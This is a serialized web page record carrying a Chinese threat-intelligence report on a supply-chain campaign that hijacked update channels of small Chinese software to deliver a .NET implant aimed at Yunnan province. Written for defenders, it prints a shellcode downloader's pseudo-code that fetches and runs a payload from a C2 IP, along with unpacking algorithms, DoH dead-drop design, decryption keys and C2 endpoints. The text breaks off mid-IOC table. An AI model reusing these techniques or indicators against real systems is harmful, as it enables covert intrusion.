[{"_1":2,"_3":4},"root",{"_5":104},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":-5,"_46":47,"_48":49,"_50":51,"_52":53,"_54":37,"_55":37,"_56":57,"_58":59,"_60":61},"expiresAt",1794271237000,"id","rhcx8rds9x59fqi7rszz9fkz3","title","奇安信披露多款国产小型软件更新供应链投毒，定向云南省","originalTitle","【原创】瞄准国内某西南省份:多款国产小型软件更新供应链攻击行动披露","summary","奇安信威胁情报中心红雨滴团队披露针对国产小型软件更新渠道的供应链投毒行动，已观察到六个国产软件的更新渠道被劫持，涵盖加速器、财务软件、鼠标连点器、电商浏览器，并发现木马化的某即时通讯客户端和被篡改的某系统管理工具。","reason","文章完整拆解了更新渠道劫持、恶意安装包投递、DoH 死信箱及内存加载链路，并给出可回溯的主机与网络指标。","source",{"_77":103},"links",{"_96":102},"publishedAt","2026-11-06T02:53:00.000Z","discoveredAt","2026-11-06T17:21:31.657Z","timelineAt","category","activity","tags",[82,99,80,100,101,78,90],"score",77,"selected",true,"channel","news","story",{"_92":93,"_13":94},"x","readingMode","full","author","body",{"_61":95,"_96":-5,"_97":96,"_98":37},"outline",[],"relatedStories",[91],"topics",[68,69,70,71,72,73,74],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation",false,"bodyLanguage","zh","factId","fmTSXVdayYpE","reportCount",1,"additionalSourceCount",0,{"_75":89,"_77":90},{"_75":87,"_77":88},{"_75":85,"_77":86},{"_75":83,"_77":84},{"_75":81,"_77":82},{"_75":79,"_77":80},{"_75":76,"_77":78},"slug","research","name","技术研究","malware","恶意软件","attack","攻击活动","black-market","数据窃取与黑产","ransomware","勒索软件","supply-chain","供应链安全","qianxin","奇安信",{"_92":93,"_13":94},"publicId","99f37ffb-5d08-4aec-9c34-9cab88dc5406","奇安信披露国产软件更新投毒行动","<p>原创 <span>红雨滴团队</span> <span>2026-11-06 10:53</span> <span>北京</span></p><p><img src=\"/dailyinfo/media/b56391722666ed72.jpg\" loading=\"lazy\" decoding=\"async\"></p><p>恶意更新包校验受害者地理位置、定向云南省目标；DoH TXT 记录作死信箱下发 C2 配置，.NET 植入体插件化内存加载不落盘——投递机制、武器组件、C2 架构与同源判据完整披露。</p><p><span><span>【原创】供应链安全 · 威胁情报</span></span></p><p><span>瞄准国内某西南省份：</span><span><br></span><span>多款国产小型软件更新供应链行动披露</span></p><p><span>恶意更新包校验受害者地理位置、定向云南省目标；DoH TXT 记录作死信箱下发 C2 配置，.NET 植入体插件化内存加载不落盘——投递机制、武器组件、C2 架构与同源判据完整披露。</span></p><p><span>· 更新供应链投毒　· DoH 死信箱　· DLL 侧载　· 内存加载　· 2026.11</span></p><p><span><span>01</span></span><span><span>&nbsp;背景</span></span></p><p><span>近年来，攻击者将目光转向安全建设相对薄弱的国产小型软件供应链。这类软件多采用 HTTP 明文接口下发更新，且不校验更新包的数字签名，攻击者只要控制更新配置接口或劫持目标流量即可向终端用户推送恶意安装包。</span></p><p><span>2026 年 10 月底，奇安信威胁情报中心红雨滴团队通过私有情报 AI 生产流程，持续监控到一起大规模的国产软件更新供应链行动，恶意更新包会验证受害者地理位置，</span><strong><span>如果位于云南省则继续执行，否则退出</span></strong><span>。截止到目前为止观察到六个国产软件的更新渠道被劫持，涵盖加速器、财务软件、鼠标连点器、电商浏览器，还发现了木马化的某即时通讯客户端和被篡改的某系统管理工具。</span></p><p><span>该行动使用 DNS over HTTPS（DoH）TXT 记录作为死信箱下发 C2 配置，最终植入体采用插件化架构在内存中加载 .NET 程序集执行，不落盘。所有变体共享一个独特的命名管道后缀&nbsp;</span><span><span>MyControlPipeaaa</span><span>，</span></span><span>成为跨变体的稳定同源判据。本文对该行动的投递机制、武器组件、C2 通信架构和同源关系进行完整披露。</span></p><p><strong><span>天擎“六合”高级威胁防御引擎已经可以对恶意更新包进行拦截：</span></strong></p><p><img src=\"/dailyinfo/media/255428484f1cdd5c.webp\" loading=\"lazy\" decoding=\"async\"></p><p><span>图 1｜天擎“六合”拦截图</span></p><p><span><span>02</span></span><span><span>&nbsp;供应链投毒入口</span></span></p><p><span>Inno Setup 恶意更新包</span></p><p><img src=\"/dailyinfo/media/d0eccf4a3a89e0e0.jpg\" loading=\"lazy\" decoding=\"async\"></p><p><span>图 2｜更新劫持与木马执行流程</span></p><p><span>攻击者拥有一套模板化的 Inno Setup 打包工具，只需输入目标软件的正版安装包与版本号，即可生成伪装成该软件更新包的恶意安装程序。展示其中三个恶意更新包：</span></p><table><tbody><tr><td><p><span>伪装软件</span></p></td><td><p><span>Inno 描述</span></p></td><td><p><span>版本号</span></p></td><td><p><span>VT 检出</span></p></td><td><p><span>SHA-256</span></p></td></tr><tr><td><p><span>某鼠标连点器</span></p></td><td><p><span>Setup A</span></p></td><td><p><span>2.9.0.2</span></p></td><td><p><span>—</span></p></td><td><span><span>5fb8b88a...</span></span></td></tr><tr><td><p><span>某记账软件</span></p></td><td><p><span>Setup B</span></p></td><td><p><span>2.3.0.0</span></p></td><td><p><span>0/76</span></p></td><td><span><span>3330b75d...</span></span></td></tr><tr><td><p><span>某游戏加速器</span></p></td><td><p><span>Setup C</span></p></td><td><p><span>4.0.6.13</span></p></td><td><p><span>1/76</span></p></td><td><span><span>bd797390...</span></span></td></tr></tbody></table><p><span>三个样本的沙箱行为均连接同一 C2 IP&nbsp;</span><span><span>107.173.84.53</span><span>，</span></span><span>依次请求&nbsp;</span><span><span>/information.php</span><span>、</span></span><span><span>/fjai87gajio.zip</span><span>、</span></span><span><span>/newxx_x64</span><span>，</span></span><span>共享同一 stage-2 ZIP 文件名和 stage-3 载荷名。其中两个样本的 PE 时间戳精确到秒一致（</span><span><span>2026-08-10T09:40:38Z）</span><span>，</span></span><span><span>imphash</span></span><span>&nbsp;一致，证明来自同一个编译产物。</span></p><p><span>这类小型国产软件多由个人开发者或小团队维护，用户量在数十万至百万级，安全建设基本空白。调查中发现，受影响软件的更新通道存在系统性安全缺陷，使得攻击者无需入侵开发者环境即可实施投毒：</span></p><ul><li><strong><span>无传输加密：</span><span>更新配置接口使用明文 HTTP，在网络链路上可被中间人篡改返回内容</span></strong></li><li><strong><span>完整性校验无独立性：</span><span>版本校验使用的 MD5 与下载地址在同一响应中下发，攻击者可同时替换二者</span></strong></li><li><strong><span>无代码签名验证：</span><span>下载的 EXE 直接执行，不校验 Authenticode 签名或开发者证书</span></strong></li><li><strong><span>版本号触发无鉴权：</span><span>攻击者只需设置高于受害主机当前版本的版本号，即可触发自动更新流程</span></strong></li></ul><p><span>这四项</span><span>缺陷的组合意味着，</span><span>攻击者一旦具备修改更新配置响应的能力（无论是入侵配置服务器、DNS 劫持还是中间人攻击），即可向全部用户静默推送任意恶意安装包。完整的更新劫持与木马执行流程见附图。</span></p><p><span>软件官网安装包供应链</span></p><p><span>攻击者通过替换官网安装包实现供应链攻击，这种手法相对来讲比较容易暴露，我们只在某办公软件上观察到这类事件：</span></p><table><tbody><tr><td><p><span>字段名称</span></p></td><td><p><span>详细信息</span></p></td></tr><tr><td><p><span>Download URL</span></p></td><td><span><span>www.XXXXXX.com/xiazai/soft.html</span></span></td></tr><tr><td><p><span>Malware MD5</span></p></td><td><span><span>144bd9f3c9cf738c95ec16febac5f6aa</span></span></td></tr></tbody></table><p><span><span>03</span></span><span><span>&nbsp;其他投递渠道（VT 扩线发现）</span></span></p><p><span>在 VT 全库以&nbsp;</span><span><span>MyControlPipeaaa</span></span><span>&nbsp;命名管道为关键词搜索，共命中 40 个相关文件。除上述 Inno Setup 家族外，还发现该攻击者同时经营另外两个投递渠道，此处仅作摘要：</span></p><table><tbody><tr><td><p><span>渠道</span></p></td><td><p><span>目标</span></p></td><td><p><span>手法</span></p></td><td><p><span>关键特征</span></p></td><td><p><span>VT</span></p></td></tr><tr><td><p><span>PE .text 注入</span></p></td><td><p><span>某系统管理工具</span></p></td><td><p><span>在入口函数植入 5 字节 call →&nbsp;</span><span><span>.text</span></span><span>&nbsp;尾部 shellcode，保留原 Microsoft 签名（checksum 失效）</span></p></td><td><p><span>WinInet →&nbsp;</span><span><span>mp.mmca-cdn.com:443</span></span><span><br></span><span>UA&nbsp;</span><span><span>curl/8.9.1</span></span></p></td><td><p><span>—</span></p></td></tr><tr><td><p><span>源码级木马化</span></p></td><td><p><span>某即时通讯客户端 216 MB</span></p></td><td><p><span>从开源项目添加后门模块后完整编译，VT 沙箱未触发后门行为</span></p></td><td><p><span>编译路径&nbsp;</span><span><span>C:\\code\\cc\\TG\\\\</span></span><span><br></span><span>DoH 域名&nbsp;</span><span><span>tg002.mmp-gep.org</span></span><span><br></span><span>XOR 密钥&nbsp;</span><span><span>ask123321</span></span></p></td><td><p><span>0/70</span></p></td></tr></tbody></table><p><span>这两个渠道与 Inno Setup 家族共享&nbsp;</span><span><span>mmca-cdn.com</span></span><span>&nbsp;注册域和&nbsp;</span><span><span>MyControlPipeaaa</span></span><span>&nbsp;命名管道后缀，但使用不同子域、不同 DoH 死信箱域名和不同加密方式。即时通讯变体的编译路径&nbsp;</span><span><span>C:\\code\\cc\\TG\\\\</span></span><span>&nbsp;中“cc”目录名暗示攻击者统一的 C2 工具开发环境。其&nbsp;</span><strong><span>0/70</span></strong><span>&nbsp;的检出率值得关注。</span></p><p><span><span>04</span></span><span><span>&nbsp;武器组件详析</span></span></p><p><span>白加黑组件</span><span>——</span><span><span>dsemanager.exe</span></span><span>&nbsp;+&nbsp;</span><span><span>atiadlxy.dll</span></span></p><p><span>Inno Setup 变体的 stage-2 载荷是一个加密 ZIP 包（口令&nbsp;</span><span><span>fjaikldmionkldfanl</span></span><span>），含三个文件：</span></p><table><tbody><tr><td><p><span>文件</span></p></td><td><p><span>大小</span></p></td><td><p><span>角色</span></p></td></tr><tr><td><span><span>dsemanager.exe</span></span></td><td><p><span>246,080</span></p></td><td><p><span>AMD 正版签名文件（白）</span></p></td></tr><tr><td><span><span>atiadlxy.dll</span></span></td><td><p><span>138,752</span></p></td><td><p><span>恶意侧载 DLL（黑），无导出，恶意代码在 DllMain</span></p></td></tr><tr><td><span><span>install.dat</span></span></td><td><p><span>891</span></p></td><td><p><span>shellcode 下载器</span></p></td></tr></tbody></table><p><span><span>dsemanager.exe</span></span><span>&nbsp;是 AMD Display Session Manager 正版组件，带有效 Authenticode 签名。它在运行时按名&nbsp;</span><span><span>LoadLibrary</span></span><span>&nbsp;加载 AMD ADL 库&nbsp;</span><span><span>atiadlxy.dll</span><span>，</span></span><span>攻击者在同目录放置同名恶意 DLL 实现 DLL 搜索顺序劫持。该恶意 DLL 无任何导出函数，</span><span><span>DllMain</span></span><span>&nbsp;在&nbsp;</span><span><span>LoadLibrary</span></span><span>&nbsp;时即执行。</span></p><p><span>ZIP 条目同时带 DOS 本地时间与 NTFS FILETIME，三条目一致的 +8h 偏移证明打包主机时区为 UTC+8。其中&nbsp;</span><span><span>atiadlxy.dll</span></span><span>&nbsp;的 PE 编译时间与 ZIP 内 mtime 仅差 0.3 秒，说明编译完毕后立即打包，是为此次投递现场编译的。</span></p><p><span>Shellcode 下载器</span><span>——</span><span><span>install.dat</span></span></p><p><span><span>install.dat</span></span><span>&nbsp;是一段 891 字节的纯内存下载器。无导入表，靠 PEB 遍历按哈希值动态解析 API。API 哈希算法种子为&nbsp;</span><span><span>0x14A1</span><span>，</span></span><span>使用&nbsp;</span><span><span>h = h * 0x21 + toupper(c)</span></span><span>&nbsp;的迭代公式，模块哈希与函数哈希相加作为最终查找值。其行为链为：</span></p><p><span><span>LoadLibraryA</span></span><span>(</span><span><span>\"wininet\"</span></span><span>)</span></p><p><span><span>InternetOpenA</span></span><span>(NULL, DIRECT, NULL, NULL, 0)&nbsp;</span><span><span>// 不发 User-Agent</span></span></p><p><span><span>InternetConnectA</span></span><span>(h,&nbsp;</span><span><span>\"107.173.84.53\"</span></span><span>, 443, ...)&nbsp;</span><span><span>// C2 IP 硬编码</span></span></p><p><span><span>HttpOpenRequestA</span></span><span>(h,&nbsp;</span><span><span>\"GET\"</span></span><span>,&nbsp;</span><span><span>\"/newxx_x64\"</span></span><span>, ...)&nbsp;</span><span><span>// stage-3 路径</span></span></p><p><span><span>InternetSetOptionA</span></span><span>(h, SECURITY_FLAGS, 0x3380)&nbsp;</span><span><span>// 显式关闭 TLS 证书校验</span></span></p><p><span><span>HttpSendRequestA</span></span></p><p><span><span>VirtualAlloc</span></span><span>(NULL, 0x1400000, COMMIT|RESERVE, RWX)&nbsp;</span><span><span>// 20 MiB 可执行缓冲</span></span></p><p><span><span>InternetReadFile</span></span><span>(..., 512000, ...)</span></p><p><span><span>call</span></span><span>&nbsp;rsi&nbsp;</span><span><span>// 直接跳入缓冲区执行</span></span></p><p><span>全程不落盘，且在两处显式关闭了 TLS 证书校验（</span><span><span>IGNORE_UNKNOWN_CA、</span></span><span><span>IGNORE_CERT_CN_INVALID</span></span><span>&nbsp;等全部标志），不验证服务器身份。</span></p><p><span>四层解包与 RemoteExeLoader .NET 植入体</span></p><p><span>stage-3 载荷&nbsp;</span><span><span>newxx_x64</span></span><span>&nbsp;包含四层嵌套解包逻辑，最终释放一个 .NET 植入体：</span></p><table><tbody><tr><td><p><span>层</span></p></td><td><p><span>算法</span></p></td><td><p><span>关键参数</span></p></td></tr><tr><td><p><span>第 1 层</span></p></td><td><p><span>滚动密钥 XOR</span></p></td><td><p><span>marker 0x43311116，key =&nbsp;</span><span><span>ROR32(key,13) + 0x12D687</span></span></p></td></tr><tr><td><p><span>第 2 层</span></p></td><td><p><span>滚动密钥 XOR（不同常量）</span></p></td><td><p><span>marker 0x3E4F43B4</span><span><span>，</span></span><span>复合密钥更新函数</span></p></td></tr><tr><td><p><span>第 3 层</span></p></td><td><p><span>aPLib 变体解压</span></p></td><td><p><span>marker 0xB3D7E5AF</span><span><span>，</span></span><span>位极性反转，产出 196,392 字节</span></p></td></tr><tr><td><p><span>第 4 层</span></p></td><td><p><span>内嵌 .NET EXE</span></p></td><td><p><span>29,184 字节，RemoteExeLoader / &nbsp;new-test-demo</span></p></td></tr></tbody></table><p><span>三层外壳统一使用「标记搜索自定位 + 跳过 cmp 立即数 +&nbsp;</span><span><span>[marker][key][len][data]</span></span><span>」容器格式。解压器属 aPLib 家族但位极性与匹配编码均为变体，标准 aPLib 无法解压，需模拟执行原始代码。</span></p><p><span>DoH TXT 死信箱 C2 机制</span></p><p><span>该行动的最显著技术特征是使用 DNS over HTTPS 的 TXT 记录作为 C2 配置的死信箱通道。RemoteExeLoader 变体与即时通讯变体均采用此机制，但密钥材料与解密方式不同：</span></p><table><tbody><tr><td><p><span>维度</span></p></td><td><p><span>RemoteExeLoader 变体</span></p></td><td><p><span>即时通讯变体</span></p></td></tr><tr><td><p><span>死信箱域名</span></p></td><td><span><span>m1m101010.fmcag.org</span></span></td><td><span><span>tg002.mmp-gep.org</span></span></td></tr><tr><td><p><span>DoH 解析器数</span></p></td><td><p><span>17 个</span></p></td><td><p><span>4 个</span></p></td></tr><tr><td><p><span>TXT 解密</span></p></td><td><p><span>AES-256-CBC（256 位密钥）</span></p></td><td><p><span>XOR（密钥&nbsp;</span><span><span>ask123321）</span></span></p></td></tr><tr><td><p><span>DoH 格式</span></p></td><td><p><span>Wire format（dns-message）</span></p></td><td><p><span>JSON format（dns-json）</span></p></td></tr><tr><td><p><span>中国 DNS 优先</span></p></td><td><p><span>是（</span><span><span>218.30.118.6/223.5.5.5</span></span><span>&nbsp;排前）</span></p></td><td><p><span>是（</span><span><span>dns.alidns.com/223.5.5.5</span></span><span>&nbsp;排前）</span></p></td></tr></tbody></table><p><span>RemoteExeLoader 变体的完整解密链已验证：TXT 记录经 base64 解码后，前 16 字节为 IV，其余为 AES-256-CBC 密文（密钥&nbsp;</span><span><span>a7l1d9i8t9l7j7c1z9f8e8y5e0c5a6w6）</span><span>，</span></span><span>解出 JSON 域名列表：</span></p><p><span>{</span></p><p><span><span>\"img1001\"</span></span><span>: [</span><span><span>\"img01.mmca-cdn.com\"</span></span><span>],</span></p><p><span><span>\"img2001\"</span></span><span>: [</span><span><span>\"img21.mmca-cdn.com\"</span></span><span>],</span></p><p><span><span>\"img3001\"</span></span><span>: [</span><span><span>\"img31.mmca-cdn.com\"</span></span><span>]</span></p><p><span>}</span></p><p><span>这些域名伪装为 CDN 图片节点，实际为业务 C2 服务器。植入体取&nbsp;</span><span><span>img1001</span></span><span>&nbsp;对应的域名作为主通道。查询时 TXT 记录存在，</span><strong><span>C2 基建仍在运营</span></strong><span>。</span></p><p><span>RemoteExeLoader 植入体详析</span></p><p><span>最终 .NET 植入体命名空间为&nbsp;</span><span><span>RemoteExeLoader</span><span>，</span></span><span>工程名&nbsp;</span><span><span>new-test-demo</span><span>，</span></span><span>无混淆。其核心能力包括：</span></p><ul><li><strong><span>插件化架构</span></strong><p><span>从 C2 下载 .NET 程序集，经 base64 + AES-256-CBC 解密后通过&nbsp;</span><span><span>Assembly.Load</span></span><span>&nbsp;在内存中加载执行，不落盘</span><span>，经过我们测试该特种木马拥有高达23个插件</span></p></li><li><strong><span>命名管道控制</span></strong><p><span>每个插件使用&nbsp;</span><span><span>&lt;plugin_name&gt;_MyControlPipeaaa</span></span><span>&nbsp;命名管道通信，支持停止命令</span></p></li><li><strong><span>主机指纹</span></strong><p><span>采集 WMI 硬件信息 + 物理 MAC（排除虚拟网卡）生成 SHA-256 GUID，落地两处互为备份</span></p></li><li><strong><span>回传加密</span></strong><p><span>AES-128-ECB，密钥 =&nbsp;</span><span><span>MD5(\"history\" + guid)</span></span><span>&nbsp;前 16 字符——防守方知道 guid 即可离线解密</span></p></li><li><strong><span>地域定向</span></strong><p><span><span>ip-api.com</span></span><span>&nbsp;查询受害机地理位置，校验「Yunnan」——明确针对云南省目标</span></p></li><li><strong><span>持久化</span></strong><p><span>计划任务「Dsemanager Update」，每 2 小时运行（</span><span><span>PT2H）</span></span></p></li><li><strong><span>心跳</span></strong><p><span>15–30 分钟随机间隔</span></p></li></ul><p><span>业务 C2 端点使用固定路径前缀&nbsp;</span><span><span>/wA8zS0xD8gT3-zzz/</span><span>，</span></span><span>固定口令参数&nbsp;</span><span><span>pass=xV6kE6cP</span><span>。</span></span><span>插件 URL 中的占位域名&nbsp;</span><span><span>ms.jsf.ink</span></span><span>&nbsp;在运行时被替换为实际 C2 域名。含&nbsp;</span><span><span>copyapp</span></span><span>&nbsp;或&nbsp;</span><span><span>appscreen</span></span><span>&nbsp;的插件在 STA 线程执行，指向剪贴板/屏幕捕获类功能。</span></p><p><span><span>05</span></span><span><span>&nbsp;同源分析</span></span></p><p><span>以下判据将四种投递机制关联为同一攻击者：</span></p><ul><li><strong><span>MyControlPipeaaa 命名管道后缀</span></strong><p><span>跨全部变体一致，VT 全库搜索仅命中本活动（40 个文件）</span></p></li><li><strong><span>DoH TXT 死信箱架构</span></strong><p><span>相同的&nbsp;</span><span><span>/resolve?name=&lt;domain&gt;&amp;type=TXT</span></span><span>&nbsp;模式</span></p></li><li><strong><span>中国境内 DNS 解析器优先</span></strong><p><span>两套配置都将阿里系解析器排在前列</span></p></li><li><strong><span>mmca-cdn.com 域名共享</span></strong><p><span>Inno Setup 变体的 C2（img01/21/31）与 PE 注入变体的下载点（mp.）属同一注册域</span></p></li><li><strong><span>同一 C2 IP + 相同 URI 路径</span></strong><p><span>三个 Inno Setup 样本的沙箱行为均连接&nbsp;</span><span><span>107.173.84.53</span><span>，</span></span><span>依次请求相同路径</span></p></li></ul><p><span><span>06</span></span><span><span>&nbsp;总结</span></span></p><p><span>该行动是一起针对多款中国国产小型软件更新通道的批量供应链投毒行动，具备以下特征：</span></p><ul><li><strong><span>多投递机制并行</span></strong><p><span>以 Inno Setup 包装为主力，辅以 PE 注入和源码编译，至少三种手法并行</span></p></li><li><strong><span>C2 通信隐蔽</span></strong><p><span>DoH TXT 死信箱下发域名配置，插件经 AES 加密内存加载，回传数据加密</span></p></li><li><strong><span>活跃运营</span></strong><p><span>stage-3 载荷持续更新，TXT 记录活跃，基建在维护中</span></p></li><li><strong><span>地域定向明确</span></strong><p><span>多层独立证据指向中国境内云南省目标</span></p></li><li><strong><span>能力盲区</span></strong><p><span>插件载荷未获取，窃密/横移/勒索的具体能力均在插件中，是当前最大的分析空白</span></p></li></ul><p><strong><span>建议立即回溯以下指标：</span></strong><span>计划任务名&nbsp;</span><span><span>Dsemanager Update</span><span>、</span></span><span>命名管道含&nbsp;</span><span><span>_MyControlPipeaaa</span><span>、</span></span><span>DNS 查询&nbsp;</span><span><span>*.fmcag.org / *.mmca-cdn.com / *.mmp-gep.org</span><span>、</span></span><span>以及 DoH 请求特征（非浏览器进程发起的&nbsp;</span><span><span>/dns-query?dns=</span></span><span>&nbsp;或&nbsp;</span><span><span>/resolve?name=）</span><span>。</span></span></p><p><span><span>07</span></span><span><span>&nbsp;IOC</span></span></p><p><span>网络指标</span></p><table><tbody><tr><td><p><span>类型</span></p></td><td><p><span>值</span></p></td><td><p><span>说明</span></p></td></tr><tr><td><p><span>IP</span></p></td><td><span><span>107.173.84.53</span></span></td><td><p><span>C2 服务器（HostPapa AS36352）</span></p></td></tr><tr><td><p><span>域名</span></p></td><td><span><span>m1m101010.fmcag.org</span></span></td><td><p><span>DoH TXT 死信箱（RemoteExeLoader）</span></p></td></tr><tr><td><p><span>域名</span></p></td><td><span><span>tg002.mmp-gep.org</span></span></td><td><p><span>DoH TXT 死信箱（即时通讯变体）</span></p></td></tr><tr><td><p><span>域名</span></p></td><td><span><span>img01.mmca-cdn.com</span></span></td><td><p><span>业务 C2（主通道）</span></p></td></tr><tr><td><p><span>域名</span></p></td><td><span><span>img21.mmca-cdn.com</span></span></td><td><p><span>业务 C2（备用）</span></p></td></tr><tr><td><p><span>域名</span></p></td><td><span><span>img31.mmca-cdn.com</span></span></td><td><p><span>业务 C2（备用）</span></p></td></tr><tr><td><p><span>域名</span></p></td><td><span><span>mp.mmca-cdn.com</span></span></td><td><p><span>注入变体下载点（Cloudflare）</span></p></td></tr><tr><td><p><span>域名</span></p></td><td><span><span>ms.jsf.ink</span></span></td><td><p><span>插件 URL 占位域名</span></p></td></tr><tr><td><p><span>URL</span></p></td><td><span><span><a href=\"https://107.173.84.53/newxx_x64\">https://107.173.84.53/newxx_x64</a></span></span></td><td><p><span>stage-3 下载点</span></p></td></tr><tr><td><p><span>URL</span></p></td><td><span><span><a href=\"https://107.173.84.53/fjai87gajio.zip\">https://107.173.84.53/fjai87gajio.zip</a></span></span></td><td><p><span>stage-2 ZIP</span></p></td></tr><tr><td><p><span>URL</span></p></td><td><span><span><a href=\"https://107.173.84.53/information.php\">https://107.173.84.53/information.php</a></span></span></td><td><p><span>回传端点</span></p></td></tr><tr><td><p><span>URL</span></p></td><td><span><span>mp.mmca-cdn.com:443/install_v.exe.shell</span></span></td><td><p><span>注入变体 stage-2</span></p></td></tr><tr><td><p><span>URI 路径</span></p></td><td><span><span>/wA8zS0xD8gT3-zzz/aaa_config_new.php</span></span></td><td><p><span>插件列表</span></p></td></tr><tr><td><p><span>URI 路径</span></p></td><td><span><span>/wA8zS0xD8gT3-zzz/aaa_getjson.php</span></span></td><td><p><span>结果回传</span></p></td></tr><tr><td><p><span>参数</span></p></td><td><span><span>pass=xV6kE6cP</span></span></td><td><p><span>固定口令</span></p></td></tr><tr><td><p><span>HTTP 头</span></p></td><td><span><span>Guid: &lt;36 字符 GUID&gt;</span></span></